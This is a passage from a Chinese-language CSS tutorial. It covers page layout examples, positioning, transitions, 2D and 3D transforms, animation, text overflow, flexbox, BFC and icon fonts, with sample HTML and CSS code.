			height: 500px;
			background-color: hotpink;
		}
		.footer {
			height: 150px;
			background-color: black;
		}
        </style>
    </head>
    <body>
	<div class="top">top</div>
	<div class="banner">banner</div>
	<div class="main">main</div>
	<div class="footer">footer</div>
    </body>
</html>
```
>[danger] ##### 两列左窄右宽型
![](https://box.kancloud.cn/0f8498ce3ef1a244bc5b23d65e5068ff_407x397.png)
```
<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="utf-8">
        <style>
		* {
			margin: 0;
			padding: 0;
		}
		.top,  /* 并集选择器给相同样式集体声明 */
		.banner,
		.main,
		.footer {
			width: 960px;
			margin: 0 auto;
			border: 1px dashed #ccc;
			text-align: center;
			background-color: #eee;
			margin-bottom: 8px;
		}
		.top {
			height: 80px;
		}
		.banner {
			height: 150px;
		}
		 .main {
			height: 500px;
		} 
		.left {
			width: 360px;
			height: 500px;
			background-color: pink;
			float: left;

		}
		.right {
			width: 592px;
			height: 500px;
			background-color: purple;
			float: right;
		}
		.footer {
			height: 120px;
		}
        </style>
    </head>
    <body>
	<div class="top">top</div>
	<div class="banner">banner</div>
	<div class="main">
		<div class="left">left</div>
		<div class="right">right</div>
	</div>
	<div class="footer">footer</div>
    </body>
</html>
```
>[danger] ##### 通栏平均分布型
![
](images/screenshot_1544971981578.png)
```
<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="utf-8">
        <style>
		* {
			margin: 0;
			padding: 0;
		}
		ul {
			list-style: none;  /* 取消列表的默认样式小点 */
		}
		.top {
			height: 60px;
			background-color: #000;
		}
		.banner {
			width: 960px;
			height: 400px;
			background-color: skyblue;
			margin: 20px auto;
			border-radius: 15px;
		}
		.main {
			width: 960px;
			margin: 0 auto;
			height: 200px;
		}
		.main ul li {
			width: 240px;
			height: 200px;
			background-color: pink;
			float: left;  /* 浮动的目的让多个块级li 一行显示 而且米有缝隙呦 */
		}
		.main ul li:nth-child(even) {  /* even 偶数  个  odd  奇数 */
			background-color: purple;
		}
		.footer {
			height: 100px;
			background-color: #000;
		}
        </style>
    </head>
    <body>
	<div class="top">top</div>
	<div class="banner">banner</div>
	<div class="main">
		<ul>
			<li>1</li>
			<li>2</li>
			<li>3</li>
			<li>4</li>
		</ul>
	</div>
	<div class="footer">footer</div>
    </body>
</html>
```
>[success] # 定位 -- position
```
1.static -- 自动定位（默认定位方式）
2.relative -- 相对定位，相对于其原文档流的位置进行定位
3.absolute -- 绝对定位，相对于其上一个已经定位的父元素进行定位
4.fixed -- 固定定位，相对于浏览器窗口进行定位
5.跟 浮动一样， 元素添加了 绝对定位和固定定位之后， 元素模式也会发生转
换， 都转换为 行内块模式， 因此 比如 行内元素 如果添加了 绝对定位或者 固定
定位后，可以不用转换模式，直接给高度和宽度就可以了。
```
| 定位模式         | 是否脱标占有位置     | 是否可以使用边偏移 | 移动位置基准           |
| ---------------- | -------------------- | ------------------ | ---------------------- |
| 静态static       | 不脱标，正常模式     | 不可以             | 正常模式               |
| 相对定位relative | 不脱标，占有位置     | 可以               | 相对自身位置移动       |
| 绝对定位absolute | 完全脱标，不占有位置 | 可以               | 相对于定位父级移动位置 |
| 固定定位fixed    | 完全脱标，不占有位置 | 可以               | 相对于浏览器移动位置   |
>[danger] ##### 静态定位 -- static
```
1.静态定位是所有元素的默认定位方式，当position属性的取值为static时，可
以将元素定位于静态位,就是网页中所有元素都默认的是静态定位哦！ 其实就
是标准流的特性。
2.在静态定位状态下，无法通过边偏移属性（top、bottom、left或right）来改变元素的位置。
```
>[danger] ##### 相对定位 -- relative
```
1.相对定位是将元素相对于它在标准流中的位置进行定位，当position属性的
取值为relative时，可以将元素定位于相对位置。
2.对元素设置相对定位后，可以通过边偏移属性改变元素的位置，但是它在文档流
中的位置仍然保留。
```
* 代码说明
![](https://box.kancloud.cn/d797ecb8308dd2dc8447090b0b773085_525x580.png)
```
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Title</title>
    <style>
        .one,.two,.three{
            width: 200px;
            height: 200px;
            background-color: yellow;
        }
        .two{
            position: relative;
            top:10px;
            left: 10px;
        }
    </style>
</head>
<body>
    <div class="one">one</div>
    <div class="two">two</div>
    <div class="three">three</div>
</body>
</html>
```
>[danger] ##### 绝对定位 -- absolute
```
1.可以通过边偏移移动位置，但是它完全脱标，完全不占位置。(类似浮动)
2.若所有父元素都没有定位，则绝对定位的元素以浏览器为准对齐
3.若父级有定位，则绝对定位的元素以父级为准对齐(常用子绝父相)，常用的不是子绝父绝原因是，一般父类元素要占据文档流，所以要是用相对定位。
4.绝对定位元素会随着它滚动，因为元素最终会相对于正常流的某一部分定位
```
 *  没有父级定位 -- 是根据浏览器位置定位
![](https://box.kancloud.cn/1143850b3199f7e6249eeea6023d245f_554x304.png)
* 有父级定位 -- 是根据父级做定位
![](https://box.kancloud.cn/43cc34edea5a80f5d9e7161aa4931348_306x300.png)
>[danger] ##### 固定定位 -- fixed
```
1. 固定定位的元素跟父亲没有任何关系，只认浏览器。
2. 固定定位完全脱标，不占有位置，不随着滚动条滚动。
```
>[danger] ##### 叠放次序 -- z-index
```
1. z-index的默认属性值是0，取值越大，定位元素在层叠元素中越居上。
2. 如果取值相同，则根据书写顺序，后来居上。
3. 后面数字一定不能加单位。
4. 只有相对定位，绝对定位，固定定位有此属性，其余标准流，浮动，静态定位都无此属性，亦不可指定此属性。
```
>[success] # 元素的显示与隐藏
```
1.在CSS中有三个显示和隐藏的单词比较常见，我们要区分开，他们分别是 display 
visibility 和 overflow。
```
>[danger] ##### display 
```
1.display 设置或检索对象是否及如何显示。
2.display : none 隐藏对象 与它相反的是 display:block 除了转换为块级元素之外，同时还有显示元素的意思。
特点： 隐藏之后，不再保留位置。
```
>[danger] ##### visibility 
```
1.设置或检索是否显示对象。
2.visible : 　对象可视
3.hidden : 　对象隐藏
4.特点： 隐藏之后，继续保留原有位置
```
>[danger] ##### display 
```
1.检索或设置当对象的内容超过其指定高度及宽度时如何管理内容。
2.visible : 　不剪切内容也不添加滚动条。
3.auto : 　 超出自动显示滚动条，不超出不显示滚动条
4.hidden : 　不显示超过对象尺寸的内容，超出的部分隐藏掉
5.scroll : 　不管超出内容否，总是显示滚动条
```
[TOC]
>[success] # 过渡 -- transition
```
1.在CSS3里使用transition可以实现补间动画（过渡效果）
2.transition: 要过渡的属性  花费时间  运动曲线  何时开始;（过渡所有属性用all代替）。
```
* 直接第一种简写，看总结第二条属性介绍

| 属性                       | 描述                                         | CSS  |
| -------------------------- | -------------------------------------------- | ---- |
| transition                 | 简写属性，用于在一个属性中设置四个过渡属性。 | 3    |
| transition-property        | 规定应用过渡的 CSS 属性的名称。              | 3    |
| transition-duration        | 定义过渡效果花费的时间。默认是 0。           | 3    |
| transition-timing-function | 规定过渡效果的时间曲线。默认是 "ease"。      | 3    |
| transition-delay           | 规定过渡效果何时开始。默认是 0。             | 3    |
* 曲线示意图
![](https://box.kancloud.cn/fc3bc8e5916fc2e6da2d5e52189d1e51_797x265.png)
> [danger] ##### 使用场景
```
1. 当我们做将鼠标悬停改变当前元素的css 属性时候，虽然不使用transition 也能实现，
但是 效果僵硬没有过度效果，这时候可以使用transition 来解决这个问题
``` 
>[danger] ##### 使用
```
1.若 transition 放在hover 中也可以执行动画效果，但是动画效果是双向的，就会
导致，当鼠标离开的时候没有动画效果，所以推荐放在主体中。
```
```
img {
  width:80px; height: 80px; border:8px solid #ccc; border-radius: 50%;
  transition:width 0.5s ease-in 0s;
}
img:hover {
   width:180px; 
}
```
>[danger] ##### 关于要改变多个元素和all 的使用
```
div {
			width: 200px;
			height: 100px;
			background-color: pink;
			/* transition: 要过渡的属性  花费时间  运动曲线  何时开始; */
			transition: width 0.6s ease 0s, height 0.3s ease-in 1s;
			/* transtion 过渡的意思  这句话写到div里面而不是 hover里面 */
  
			
}
div:hover {  /* 鼠标经过盒子，我们的宽度变为400 */

			width: 600px;
			height: 300px
}

transition: all 0.6s;  /* 所有属性都变化用all 就可以了  后面俩个属性可以省略 */
```
[TOC]

 
>[success] # transform -- 变形操作
```
1.transition 和transform  单词相似不同点是，transition  是用来做动画过渡，
也就是当我们通过某种方式去改变元素的时候，为了让效果没有 那么突兀有
一种循序渐进的感觉使用
2.transform，可以实现元素的位移、旋转、倾斜、缩放，甚至支持矩阵方式
```
>[danger] ##### 实现位移效果 -- translate(x, y)    
```
1.translate 移动平移的意思
2.translate(x,y)水平方向和垂直方向同时移动（也就是X轴和Y轴同时移动）
3.translateX(x)仅水平方向移动（X轴移动）
4.translateY(Y)仅垂直方向移动（Y轴移动）
```
* 案例配合 移动效果
```
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Document</title>
    <style>
    div {
        width: 100px;
        height: 100px;
        background-color: pink;
        /*transform: translateX(x, y)*/
        /*变形： 移动*/
        transition: all 0.5s;

    }
        div:active { 
            transform: translateX(100px);
         /*a:active 
            鼠标没点击没有松开鼠标的时候触发的状态 相当于点击*/
            /*transform: translate(50px, 50px); 当我们点击之后再移动位置*/
        /*transform: translate(50px); 当我们点击之后再移动位置 x轴*/
            /*transform: translate(0, 50px); 当我们点击之后再移动位置 y轴*/
             /*只跟一个参数就是 X*/
        /*transform: translateY(100px); 只跟一个参数就是 Y*/
        }
    </style>
</head>
<body>
    <div></div>
</body>
</html>
```
>[danger] ##### 缩放 -- scale(x, y) 
```
1. scale()的取值默认的值为1，当值设置为0.01到0.99之间的任何值，作用
使一个元素缩小；而任何大于或等于1.01的值，作用是让元素放大
2.scale(X,Y)使元素水平方向和垂直方向同时缩放（也就是X轴和Y轴同时缩放）
3.scaleX(x)元素仅水平方向缩放（X轴缩放）
4.scaleY(y)元素仅垂直方向缩放（Y轴缩放）
5.例如transform:scale(0.8,1); 解释：可以对元素进行水平和垂直方向的缩
放。该语句使用scale方法使该元素在水平方向上缩小了20%，垂直方向上不缩放。
```
>[danger] ##### 旋转 rotate(deg) 
```
1.可以对元素进行旋转，正值为顺时针，负值为逆时针；
2.例如：transform:rotate(45deg); 解释：单位是 deg 度数  	
```
* 默认物体中心为旋转中心
![](https://box.kancloud.cn/6481f097bc78630c1167e4e8e538c21a_221x191.png)
>[danger] ##### 调整元素转换变形的原点 -- transform-origin
```
1. 选中默认是圆心，为了调整旋转的定位点可以使用该属性
2.例如： div{transform-origin: left top;transform: rotate(45deg); }  /* 改变元素原点到左上角，然后进行顺时旋转45度 */  
3.当想精确到像素点的时候可以： div{transform-origin: 10px 10px;transform: rotate(45deg); }  /* 改变元素原点到x 为10  y 为10，然后进行顺时旋转45度 */ 
```
* 一组图片旋转案例（可以看详细文档的扑克牌案例）
```
div {
			width: 250px;
			height: 170px;
			border: 1px solid pink;
			margin: 200px auto;
			position: relative;

		}
		div img {
			width: 100%;
			height: 100%;
			position: absolute;
			top: 0;
			left: 0;
			transition: all 0.6s;
			transform-origin: top right;
		}
		div:hover img:nth-child(1) {  /* 鼠标经过div  第一张图片旋转 */
			transform: rotate(60deg);
		}
		div:hover img:nth-child(2) {  
			transform: rotate(120deg);
		}
		div:hover img:nth-child(3) {  
			transform: rotate(180deg);
		}
		div:hover img:nth-child(4) {  
			transform: rotate(240deg);
		}
		div:hover img:nth-child(5) {  
			transform: rotate(300deg);
		}
		div:hover img:nth-child(6) {  
			transform: rotate(360deg);
		}
```
>[danger] ##### 倾斜 --  skew(deg, deg) 
```
1.可以使元素按一定的角度进行倾斜，可为负值，第二个参数不写默认为0。
2.transform:skew(30deg,0deg);
```
![](https://box.kancloud.cn/666654eb2e9cba57b54a2cb3f5c173b2_263x157.png)
[TOC]

 
>[success] # 3D变形(CSS3)  -- transform
```
1.3d 和2d不同点是多了一个z轴,2d都是一些平移效果，3d可以让它按照轴为中心旋转
2.为了增加空间想象多了一个左手法则
解释：伸出左手，让拇指和食指成“L”形，大拇指向右，食指向上，中指指向
前方。这样我们就建立了一个左手坐标系，拇指、食指和中指分别代表X、
Y、Z轴的正方向。如下图
```
* 方向判断的口诀
```
x左边是负的，右边是正的
y上面是负的， 下面是正的
z里面是负的， 外面是正的
```
![](https://box.kancloud.cn/c0941a5cc13fa2cda415e1796ae6b6a7_387x358.png)
>[danger]  ##### rotateX() 
```
1.就是沿着 x 立体旋转.例如transform:rotateX(180deg);旋转时候也是图片中
心为轴旋转
```
>[danger]  ##### rotateY()
```
1.就是沿着 y 立体旋转.例如transform:rotateY(180deg);旋转时候也是图片中
心为轴旋转
```
>[danger]  ##### rotateZ() 
```
1.就是沿着 z 立体旋转.例如transform:rotateZ(180deg);旋转时候也是图片中
心为轴旋转
```
>[danger] ##### 移动 translateX(x)/translateY(y)/translateZ(z)
```
1.3d比2d 移动多了一个 translateZ(z)
2.[注意]其中，x和y可以是长度值，也可以是百分比，百分比是相对于其本
身元素水平方向的宽度和垂直方向的高度和；z只能设置长度值
3.简写：translate3d(x,y,z)
```
>[danger] ##### 透视 -- perspective
```
1.电脑显示屏是一个2D平面，图像之所以具有立体感（3D效果），其实只是一种视觉呈现，通过透视可以实现此目的。
2.透视可以将一个2D平面，在转换的过程当中，呈现3D效果。
- 透视原理： 近大远小 。
- 浏览器透视：把近大远小的所有图像，透视在屏幕上。
- perspective：视距，表示视点距离屏幕的长短。视点，用于模拟透视效果时人眼的位置
3.并非任何情况下需要透视效果，根据开发需要进行设置。
4.perspective 一般作为一个属性，设置给父元素，作用于所有3D转换的子元素
```
* 使用透视案例
```
<!doctype html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Document</title>
    <style>
        body {
            perspective: 1000px;  /*视距 距离 眼睛到屏幕的距离  视距越大效果越不明显 视距越小，透视效果越明显*/
        }
        img {
            display: block;
            margin: 100px auto;
            transition: all 1s;
        }
        img:hover {
            transform: rotateX(360deg);
        }
    </style>
</head>
<body>
<img src="images/x.jpg" alt=""/>
</body>
</html>
```
>[danger] ##### 元素不面向屏幕时是否可见 -- backface-visibility 
```
1.backface-visibility 属性定义当元素不面向屏幕时是否可见。
```
* 反转盒子案例
```
div {
			width: 224px;
			height: 224px;
			margin: 100px auto;
			position: relative;
		}
		div img {
			position: absolute;
			top: 0;
			left: 0;
			transition: all 1s; 
		}
		div img:first-child {
			z-index: 1;
			backface-visibility: hidden; /* 不是正面对象屏幕，就隐藏 */
		}
		div:hover img {
			transform: rotateY(180deg);
}
```
>[danger] ##### 开门案例
![](https://box.kancloud.cn/52f038b2eb80cf696282c7a469e90d8c_1092x608.png)
```
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Title</title>
    <style>
        section{
            width: 500px;
            height: 500px;
            margin: 0 auto;
            background: url(images/3.jpg) no-repeat;
            background-size: cover;
            position: relative;
            perspective: 1000px;  /*给父盒子添加透视效果 一定要加透视效果*/
        }
        .ldoor,.rdoor{
            position: absolute;
            background-color: red;
            border:1px solid #000;
            top:0;
            width: 250px;
            height: 500px;
        }
        .ldoor{
            transform-origin: left;/*旋转轴*/
            left: 0;
        }
        .rdoor{
            transform-origin: right;/*旋转轴*/
            right: 0;
        }
        /*鼠标经过section 盒子 两个门盒子 翻转 rotateY*/
        section:hover .ldoor {
            transform: rotateY(-130deg);  /*因为往左边翻转，所以是负值*/
        }
        section:hover .rdoor {
            transform: rotateY(130deg);
        }

    </style>
</head>
<body>
<section>
    <div class="ldoor"></div>
    <div class="rdoor"></div>
</section>
</body>
</html>
```
>[success] #  css3动画-- animation
```
1.和transition 过渡动画不一样的时，他可以设置多个节点。每个节点有不同’
的动画效果。
2.也可以页面一打开就直接执行
3.和transition 类似的点都是执行后会回到最初的位置
```
>[danger] ##### 语法
```
1.animation:动画名称 动画时间 运动曲线  何时开始  播放次数  是否反方向;
animation-iteration-count:infinite;  无限循环播放
animation-play-state:paused;   暂停动画"
```
![](https://box.kancloud.cn/6b292377a4f9d0edad435148b676ef56_775x341.png)
```
<!doctype html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Document</title>
    <style>
        div {
            width: 100px;
            height: 100px;
            background-color: pink;
            /*animation: go 2s ease 0s infinite alternate; 引用动画*/
            animation: go 2s infinite; /*引用动画*/
            /*animation:动画名称 动画时间 运动曲线  何时开始  播放次数  是否反方向;*/
            /*动画名称是自己定义的 go google*/
            /*infinite 无限循环*/
            /*一般情况下，我们就用前2个 animation: go 2s*/
        }
        /*@keyframes go {}  定义动画*/
        @keyframes go {
            0% { /*起始位置，等价于 form*/
                transform: translate3d(0, 0, 0) ;
            }
            25% {
                transform: translate3d(800px, 0, 0);
            }
            50% {
                transform: translate3d(800px, 400px, 0);

            }
            75% {
                transform: translate3d(0, 400px, 0);

            }
            100% {
                transform: translate3d(0, 0, 0);  /*100% 相当于结束位置 to*/

            }
        }
       /* 动画结束之后会返回原来的位置！！！*/
    </style>
</head>
<body>
<div></div>
</body>
</html>
```

[TOC]
>[success] # 常用篇
```
1.鼠标样式      -- cursor
2.轮廓          -- outline
3.防止拖拽文本域 -- resize
4.垂直对齐       -- vertical-align
5.图片和文字对齐
6.去除图片底侧空白缝隙
```
 >[danger] ##### 调整鼠标样式 -- cursor
```
1.cursor :  default  箭头 | pointer  小手  | move  移动  |  text  文本
```
>[danger] ##### 调整input轮廓  -- outline
```
1.有时候我们需要去除 input 的轮廓线因此需要这个属性帮忙
2.用法： outline : outline-color ||outline-style || outline-width 
3.粗暴写法一次到位 outline: 0;  例如： <input  type="text"  style="outline: 0;"/>
```
>[danger] ##### 禁止textarea可以拖拽 -- resize
```
1.<textarea  style="resize: none;"></textarea>
```
>[danger] ##### vertical-align  -- 行内块元素垂直对齐
```
1.vertical-align : baseline |top |middle |bottom 
解释：
    baseline -- 基线对齐
    top -- 顶部对齐
    middle -- 垂直居中
    bottom -- 底部对齐
2.图片和文字对齐
3.去除图片底侧空白缝隙，在低版本浏览器img的底线会和父级盒子的基线对齐。 
这样会造成一个问题，就是图片底侧会有一个空白缝隙。解决办法：给img 
vertical-align:middle | top 或者 给img 添加 display：block; 转换为块级元素就不会存在问题了。
```
* 常见图片和文字默认基线对齐
![](https://box.kancloud.cn/6709ae785ca502f9a9d3a3fc2592764f_351x145.png)
* 为了让文字在图片居中对齐，给图片设置vertical-align
![](https://box.kancloud.cn/47cb5cb4a31f75f77a7a2c4576a17ebe_259x159.png)
```
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Title</title>
    <style>
        img{
            vertical-align:middle;
        }
    </style>
</head>
<body>
    <div>
        <img src="images/2.png"> 222
    </div>
</body>
</html>
```
* 也可以给input 或者 textarea 做设置让文字和表单元素居中对齐，也可以设置行高

>[success] # 文字溢出
```
1.处理英文 -- word-break
2.出列汉字 -- white-space
3.文字溢出 -- text-overflow 
```
>[danger] #####  word-break -- 换行后处理英文单词是否打碎
```
1.normal   使用浏览器默认的换行规则。
2.break-all   允许在单词内换行。
3.keep-all    只能在半角空格或连字符处换行。
解释：
normal和keep-all  展示效果一致的，区别在于真的语言略有区别，但可以忽略
```
* break-all 英文句子长度超过块元素的宽度时，不会保证单词的完整度而打断单词
![](https://box.kancloud.cn/e8dc94021a03cfacf34e5c50451e3b40_207x54.png)
* keep-all 会保证单词完整度，但是单词有‘-’ 符号除外
 ![](https://box.kancloud.cn/35149ac3174f8dffceaa3fd8b82bc59a_157x49.png)
>[danger] ##### white-space -- 强制在一行显示(中英都好用）
```
1.normal : 　默认处理方式
2.nowrap : 　强制在同一行内显示所有文本，直到文本结束或者遭遇br标签对象才换行。
```
>[danger] ##### text-overflow -- 文字溢出是否显示省略号
```
1.clip : 　不显示省略标记（...），而是简单的裁切 
2.ellipsis : 　当对象内文本溢出时显示省略标记（...）
3.注意一定要首先强制一行内显示，再次和overflow属性  搭配使用
```
* 案例
```
<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="utf-8">
        <style>
		div {
			width: 120px;
            height: 20px;
            border: 1px solid #f00;
            white-space: nowrap;  /* 首先先需要添加这句话 强制一行*/
            overflow: hidden;  /* 其次必须有这句话 */
            /* text-overflow: clip;  直接裁剪 */
            text-overflow: ellipsis;  /* 超出的部分，省略号代替 */
		}
        </style>
    </head>
    <body>
    <div>
    	我的名字是 你好才是大家好  
    </div>
    </body>
</html>
```
>[danger] ##### 多行文字
* 只兼容 webkit 内核的
```
overflow: hidden;溢出隐藏
text-overflow: ellipsis; 使用省略号显示未显示内容
-webkit-box-orient: ; 设置盒子内的对象排序方式
display: -webkit-box; 将对象设置为伸缩盒子显示
-webkit-line-clamp: 用来限制行数
以p标签伪列
p{
    display: -webkit-box;
    -webkit-box-orient:vertical; /*垂直排列*/
    -webkit-line-clamp:2;
    overflow: hidden;
    text-overflow: ellipsis;
}
```
* 兼容所有浏览器
```
p{
    height: 30px; /*块级元素的高，比如实际文字内容将块级元素撑开的高度是60px，我们设置展示高度小于实际高度*/
    line-height: 2em;/*设置行高这样让单行文字显示清晰*/
    overflow: hidden;/*由于高度小于实际高度，这样溢出的文字就会被隐藏*/
    border: 1px solid red;/*根据需求来添加边框*/
    position: relative;/*为接下来的伪元素做的 定位*/
}

p::after{
    content: '...';/*设置省略号*/
    position: absolute;
    right: 0;
    bottom: 0;/*设置定位位置在最右面*/
    padding:0 0 0 10px ;
    background: #fff; /*设置背景颜色，这样三个点所在的伪元素的背景颜色就会盖住最后的字*/
}
```

>[success] # flex 伸缩布局
```
1.布局的传统解决方案，基于[盒状模型]，依赖[`display`]属性 +[`position`]属性 +
[`float`]属性。
2.flex 可以更方便的实现我们想要的布局方式
3.设为 Flex 布局以后，子元素的`float`、`clear`和`vertical-align`属性将失效。
```
>[danger] #####  display: flex -- 伸缩布局模式
```
1.给元素父类设置display: flex ，这个盒子就会有弹性盒子的特性，内部就可以使
用弹性盒子效果,默认内部盒子水平进行弹性布局，也可以利用 flex-direction属
性，改变内部排列的方式。
2.当外部的盒子变成了弹性盒子，给内部添加flex 属性设置个个盒子的占比，也可
以固定其中的宽度，作为指定宽度
3.解释第一条：可以给指定为弹性盒子的父盒子设置 -- flex-direction,来做内部的
排列方式：flex-direction: column 垂直排列，flex-direction: row 水平排列
4.解释第二条:flex子项目在主轴的缩放比例，不指定flex属性，则不参与伸缩分配
min-width 最小值 min-width: 280px 最小宽度 不能小于 280
max-width: 1280px 最大宽度 不能大于 1280
```
* 实现下面效果的代码
![](https://box.kancloud.cn/3bf4d0f1976ffb4120263798941c5804_1173x223.png)
```
<!doctype html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Document</title>
    <style>
        section {
            width: 80%;
            height: 200px;
            border: 1px solid pink;
            margin: 100px auto;
            /*父盒子添加 flex*/
            display: flex;  /*伸缩布局模式*/
            min-width: 500px;
        }
        section div {
            height: 100%;
        }
        section div:nth-child(1) {
            background-color: pink;
            width: 200px;
        }
        section div:nth-child(2) {
            background-color: purple;
            margin: 0 5px;
            width: 100px; /*指定一个盒子的固定宽度*/
        }
        section div:nth-child(3) {
            background-color: pink;
            flex: 1;/*子盒子添加分数*/
        }
        section div:nth-child(4) {
            background-color: skyblue;
            flex: 1;/*子盒子添加分数*/ 可以设置两份三分都可以
        }
    </style>
</head>
<body>
<section>
    <div>1</div>
    <div>2</div>
    <div>3</div>
    <div>4</div>
</section>
</body>
</html>
```
* 实现这种布局 -- 设置flex-direction 属性
![](https://box.kancloud.cn/8a4942d837ddc5790fa6403f5b41f8e4_285x267.png)
```
<!doctype html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Document</title>
    <style>
        section {
            width: 80%;
            height: 200px;
            border: 1px solid pink;
            margin: 100px auto;
            /*父盒子添加 flex*/
            display: flex;  /*伸缩布局模式*/
            min-width: 500px;
            flex-direction: column; /*给父盒子添加 排列方式 可以是水平 也可以 是 垂直*/
        }
        section div {



        }
        section div:nth-child(1) {
            background-color: pink;
            width: 200px;
        }
        section div:nth-child(2) {
            background-color: purple;
            margin: 0 5px;
            width: 100px;
        }
        section div:nth-child(3) {
            background-color: pink;
            flex: 1;/*子盒子添加分数*/
        }
        section div:nth-child(4) {
            background-color: skyblue;
            flex: 1;/*子盒子添加分数*/
        }
    </style>
</head>
<body>
<section>
    <div>1</div>
    <div>2</div>
    <div>3</div>
    <div>4</div>
</section>
</body>
</html>
```
>[danger] ##### 细节操作
```
1.justify-content --- 水平的时候，设置内部对齐方式调整主轴对齐 
2.align-items -- 调整侧轴对齐（垂直对齐）
3.flex-wrap -- 控制是否换行
4. flex-flow: flex-direction  flex-wrap;  -- flex-flow是flex-direction、flex-wrap的简写形式，白话记： flex-flow: 排列方向 换不换行;
5. align-content -- 上面的都是控制块的，这个是控制以行为整体的 效果展示
```
* justify-content

| 值 | 描述 | 白话文 |
| - | - | - |
| flex-start | 默认值。项目位于容器的开头。 | 让子元素从父容器的开头开始排序但是盒子顺序不变 |
| flex-end | 项目位于容器的结尾。 | 让子元素从父容器的后面开始排序但是盒子顺序不变 |
| center | 项目位于容器的中心。 | 让子元素在父容器中间显示 |
| space-between | 项目位于各行之间留有空白的容器内。 | 左右的盒子贴近父盒子，中间的平均分布空白间距 |
| space-around | 项目位于各行之前、之间、之后都留有空白的容器内。 | 相当于给每个盒子添加了左右margin外边距 |

* align-items调整侧轴对齐

| 值 | 描述 | 白话文 |
| --- | --- | --- |
| stretch | 默认值。项目被拉伸以适应容器。 | 让子元素的高度拉伸适用父容器（子元素不给高度的前提下) |
| center | 项目位于容器的中心。 | 垂直居中 |
| flex-start | 项目位于容器的开头。 | 垂直对齐开始位置 上对齐 |
| flex-end | 项目位于容器的结尾。 | 垂直对齐结束位置 底对齐 |
* flex-wrap控制是否换行

| 值 | 描述 |
| --- | --- |
| nowrap | 默认值。规定灵活的项目不拆行或不拆列。 不换行，则 收缩（压缩） 显示 强制一行内显示 |
| wrap | 规定灵活的项目在必要的时候拆行或拆列。 |
| wrap-reverse | 规定灵活的项目在必要的时候拆行或拆列，但是以相反的顺序。 |

* align-content堆栈（由flex-wrap产生的独立行）多行垂直对齐方式齐

| 值 | 描述 | 测试 |
| --- | --- | --- |
| stretch | 默认值。项目被拉伸以适应容器。 |  |
| center | 项目位于容器的中心。 |  |
| flex-start | 项目位于容器的开头。 |  |
| flex-end | 项目位于容器的结尾。 |  |
| space-between | 项目位于各行之间留有空白的容器内。 |  |
| space-around | 项目位于各行之前、之间、之后都留有空白的容器内。 |  |

>[success] # BFC
```
1.BFC全称”Block Formatting Context”, 中文为“块级格式化上下文”。
2.BFC元素特性表现原则就是，内部子元素再怎么翻江倒海，翻云覆雨都不会影响外部的元素。
3.display 属性为 block, list-item, table 的元素，会产生BFC.
4.这些元素添加如下属性就可以触发BFC。
    float属性不为none
    position为absolute或fixed
    display为inline-block, table-cell, table-caption, flex, inline-flex
    overflow不为visible。
```
>[danger] ##### BFC -- 特性
```
1.在BFC中，盒子从顶端开始垂直地一个接一个地排列.
2.盒子垂直方向的距离由margin决定。属于同一个BFC的两个相邻盒子的margin会发生重叠
3.在BFC中，每一个盒子的左外边缘（margin-left）会触碰到容器的左边缘(border-left)（对于从右到左的格式来说，则触碰到右边缘）。
3.1.  BFC的区域不会与浮动盒子产生交集，而是紧贴浮动边缘。
3.2.  计算BFC的高度时，自然也会检测浮动或者定位的盒子高度。
```
>[danger] ##### BFC -- 作用
```
1. 清除元素内部浮动
只要把父元素设为BFC就可以清理子元素的浮动了，最常见的用法就是在父
元素上设置overflow: hidden样式，对于IE6加上zoom:1就可以了。
2.外边距合并的问题。
盒子垂直方向的距离由margin决定。属于同一个BFC的两个相邻盒子的
margin会发生重叠，属于同一个BFC的两个相邻盒子的margin会发生重叠，
那么我们创建不属于同一个BFC，就不会发生margin重叠了。
3.制作右侧自适应的盒子问题
普通流体元素BFC后，为了和浮动元素不产生任何交集，顺着浮动边缘形成自己的封闭上下文
```
* 第三条的布局代码
```
```
<!DOCTYPE html>
<html>
<head lang="en">
    <meta charset="UTF-8">
    <title></title>
    <style>
        .father {
            width: 400px;
            height: 500px;
            border: 1px solid #000;
            margin: 0 auto;
        }
        .box {
            width: 100px;
            height: 100px;
            background-color: pink;
            float: left;
        }

        .txt {
            height: 300px;
            background-color: purple;
            overflow: hidden;  /*给txt 创建BFC 区域 在不和浮动产生交集 紧贴制浮动的边缘 */
            
        }
    </style>
</head>
<body>
<div class="father">
    <div class="box"></div>
    <div class="txt">我可以制作右侧自适应的盒子我可以制作右侧自适应的盒子我可以制作右侧自适应的盒子
        我可以制作右侧自适应的盒子我可以制作右侧自适应的盒子我可以制作右侧自适应的盒子我可以制作右侧自适应的盒子
        我可以制作右侧自适应的盒子我可以制作右侧自适应的盒子我可以制作右侧自适应的盒子
        我可以制作右侧自适应的盒子我可以制作右侧自适应的盒子我可以制作右侧自适应的盒子</div>
</div>
</body>
</html>
```
```
>[success] # 精灵图和文字篇
```
1.CSS 精灵其实是将网页中的一些背景图像整合到一张大图中（精灵图），然而，
各个网页元素通常只需要精灵图中不同位置的某个小图，要想精确定位到精灵图中
的某个小图，就需要使用CSS的background-image、background-repeat和
background-position属性进行背景定位，其中最关键的是使用background-position
属性精确地定位。
2.图片是有诸多优点的，但是缺点很明显，比如图片不但增加了总文件的大小，还
增加了很多额外的"http请求"，这都会大大降低网页的性能的。更重要的是图片不能
很好的进行“缩放”，因为图片放大和缩小会失真。 我们后面会学习移动端响应式，
很多情况下希望我们的图标是可以缩放的。此时，一个非常重要的技术出现了，额
不是出现了，是以前就有，是被从新"宠幸"啦。。 这就是字体图标（iconfont).
```
>[danger] ##### 常见的字体库网站
```
1.icomoon字库 --  http://www.iconfont.cn/
2.阿里icon font字库 -- http://www.iconfont.cn/
3.fontello -- [http://fontello.com/](http://fontello.com/)
4.Font-Awesome-- [http://fortawesome.github.io/Font-Awesome/](http://fortawesome.github.io/Font-Awesome/)
